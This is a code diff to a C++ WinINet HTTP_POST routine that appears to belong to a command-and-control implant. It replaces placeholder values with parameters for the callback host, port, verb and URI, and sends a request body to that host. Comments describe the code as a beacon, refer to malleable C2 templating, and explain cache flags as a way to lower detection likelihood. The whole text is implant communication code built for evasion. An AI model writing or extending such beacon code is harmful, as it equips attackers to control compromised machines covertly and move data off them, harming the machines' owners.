@@ -82,12 +82,12 @@ bool HTTP_GET(const std::wstring& callback_host, int callback_port, std::wstring
     return true;
 }
 
-
-bool HTTP_POST(std::string data, std::vector<std::wstring>& headers, std::string& response) {
+//(const std::wstring& callback_host, int callback_port, std::wstring http_verb, const std::wstring& uri, const std::vector<std::wstring>& headers, std::string& request_body, std::string& response) {
+bool HTTP_POST(const std::wstring& callback_host, int callback_port, std::wstring http_verb, const std::wstring& uri, const std::vector<std::wstring>& headers, std::string& request_body, std::string& response) {
     // 1. Initialize
     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw
     HINTERNET hInternet = InternetOpenW(
-        L"temp",//L"[[http_user_agent]]",                // user agent - template, malc2 this
+        NULL,   // user agents passed in headers                // user agent - template, malc2 this
         INTERNET_OPEN_TYPE_PRECONFIG,     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena#parameters: INTERNET_OPEN_TYPE_PRECONFIG: proxy OR direct, based on registry (matches inet expl)
         NULL,
         NULL,
@@ -99,8 +99,8 @@ bool HTTP_POST(std::string data, std::vector<std::wstring>& headers, std::string
     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnectw
     HINTERNET hConnect = InternetConnectW(
         hInternet,
-        L"temp",//L"[[callback_host]]",           // Server - template,
-        9999,//[[callback_port]],                   // Port - template
+        callback_host.c_str(), //L"[[callback_host]]",           // Server - template,
+        static_cast<DWORD>(callback_port), //[[callback_port]],                   // Port - template
         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
     );
     if (!hConnect) {
@@ -112,8 +112,8 @@ bool HTTP_POST(std::string data, std::vector<std::wstring>& headers, std::string
     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequestw
     HINTERNET hRequest = HttpOpenRequestW(
         hConnect,
-        L"temp",//L"[[http_post_verb]]",                // Method - template, mallc2 this
-        L"temp",//L"[[http_post_uri]]",          // Path - template, mallc2 this
+        http_verb.c_str(),//L"[[http_post_verb]]",                // Method - template, mallc2 this
+        uri.c_str(),//L"[[http_post_uri]]",          // Path - template, mallc2 this
         NULL, NULL, NULL,
         INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
         0
@@ -133,8 +133,7 @@ bool HTTP_POST(std::string data, std::vector<std::wstring>& headers, std::string
 
     // 5. Send Request
     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequestw
-    LPVOID post_data = (LPVOID)data.c_str();
-    if (!HttpSendRequestW(hRequest, NULL, 0, post_data, data.length())) {
+    if (!HttpSendRequestW(hRequest, NULL, 0, (LPVOID)request_body.c_str(), request_body.length())) {
         std::cerr << "Send failed: " << GetLastError() << std::endl;
         InternetCloseHandle(hRequest);
         InternetCloseHandle(hConnect);
